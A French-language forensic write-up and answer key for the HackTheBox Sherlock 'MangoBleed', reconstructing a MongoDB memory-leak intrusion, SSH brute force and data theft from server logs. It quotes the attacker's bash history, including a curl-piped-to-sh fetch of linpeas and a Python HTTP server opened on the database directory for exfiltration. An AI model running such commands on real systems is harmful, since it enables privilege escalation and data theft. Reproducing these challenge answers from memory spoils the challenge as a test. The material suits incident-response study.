# MangoBleed - HackTheBox Sherlock

## Scenario

Incident prioritaire impliquant un serveur compromis. 
L'hôte `mongodbsync` est un serveur MongoDB secondaire. 
L'administrateur a mentionné une vulnérabilité appelée **MongoBleed**. 
Une acquisition triage a été collectée avec UAC pour l'analyse forensique.

## Artefacts Clés

L'analyse se concentre sur ces fichiers du triage UAC :
- `/var/log/mongodb/mongod.log` - Logs du serveur MongoDB
- `/var/log/auth.log` - Logs d'authentification SSH
- `/home/mongoadmin/.bash_history` - Historique des commandes de l'attaquant
- `/etc/mongod.conf` - Configuration MongoDB

---

## Task 1 : ID CVE de la vulnérabilité MongoDB

**Réponse : `CVE-2024-12029`**

MongoBleed est une vulnérabilité de divulgation mémoire dans MongoDB permettant à un attaquant de fuiter des informations sensibles via des séquences rapides de connexion/déconnexion.

---

## Task 2 : Version de MongoDB installée

**Réponse : `8.0.16`**

Trouvée dans les logs MongoDB au démarrage :
```json
{"msg":"Build Info","attr":{"buildInfo":{"version":"8.0.16"...}}}
```

Confirmée aussi dans `auth.log` :
```
COMMAND=/usr/bin/apt install -y mongodb-org=8.0.16
```

---

## Task 3 : Adresse IP distante de l'attaquant

**Réponse : `65.0.76.43`**

L'attaquant s'est connecté à MongoDB depuis cette IP, visible dans mongod.log :
```json
{"msg":"Connection accepted","attr":{"remote":"65.0.76.43:35340"...}}
```

---

## Task 4 : Date et heure du début de l'exploitation

**Réponse : `2025-12-29 05:25:52`**

Première connexion malveillante dans les logs MongoDB :
```json
{"t":{"$date":"2025-12-29T05:25:52.743+00:00"},"msg":"Connection accepted","attr":{"remote":"65.0.76.43:35340"}}
```

---

## Task 5 : Nombre total de connexions malveillantes

**Réponse : `37630`**

Compté avec :
```bash
grep -c "Connection accepted.*65.0.76.43" mongod.log
```

Les connexions ont eu lieu entre `05:25:52` et `05:27:07` (~75 secondes), soit ~500 connexions/seconde - caractéristique d'un exploit de type "bleed".

---

## Task 6 : Quand l'attaquant a-t-il obtenu un accès distant interactif ?

**Réponse : `2025-12-29 05:40:03`**

Après une attaque brute-force contre `mongoadmin` (utilisant probablement les credentials fuités via MongoBleed), l'attaquant s'est connecté via SSH :

```
2025-12-29T05:40:03 sshd[39962]: Accepted keyboard-interactive/pam for mongoadmin from 65.0.76.43 port 46062 ssh2
```

Le brute-force a commencé à `05:39:18` avec de nombreuses tentatives échouées visibles dans `auth.log`.

---

## Task 7 : Ligne de commande pour le script de privilege escalation en mémoire

**Réponse : `curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh`**

Trouvée dans `/home/mongoadmin/.bash_history` :
```bash
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

L'attaquant a utilisé linpeas.sh (Linux Privilege Escalation Awesome Script) pipé directement vers le shell pour éviter d'écrire sur le disque.

---

## Task 8 : Répertoire ciblé pour l'exfiltration

**Réponse : `/var/lib/mongodb`**

Depuis `.bash_history` :
```bash
cd /var/lib/mongodb/
ls -la
python3 -m http.server 6969
```

L'attaquant a accédé au répertoire de données MongoDB et lancé un serveur HTTP Python sur le port 6969 pour l'exfiltration.

---

## Chronologie

| Heure (UTC) | Événement |
|-------------|-----------|
| 05:11:47 | MongoDB 8.0.16 installé et démarré |
| 05:17:25 | Utilisateur `mongoadmin` créé |
| 05:25:52 | Exploitation MongoBleed commence (37630 connexions) |
| 05:27:07 | Fin de l'exploitation |
| 05:39:18 | Attaque brute-force SSH démarre |
| 05:40:03 | Attaquant obtient accès SSH comme `mongoadmin` |
| 05:42:03 | Tentative sudo échouée |
| 05:42:05 | Script linpeas de privilege escalation exécuté |
| ~05:45 | Exfiltration de données depuis /var/lib/mongodb |
| 05:48:28 | Attaquant se déconnecte |

---

## Analyse des Causes

1. **Version MongoDB vulnérable** : 8.0.16 affectée par CVE-2024-12029
2. **Exposé sur internet** : MongoDB bindé sur `0.0.0.0` sans authentification
3. **Pas de configuration sécurité** : `#security:` commenté dans mongod.conf
4. **Mot de passe faible** : Le password de `mongoadmin` était probablement exposé via la fuite mémoire
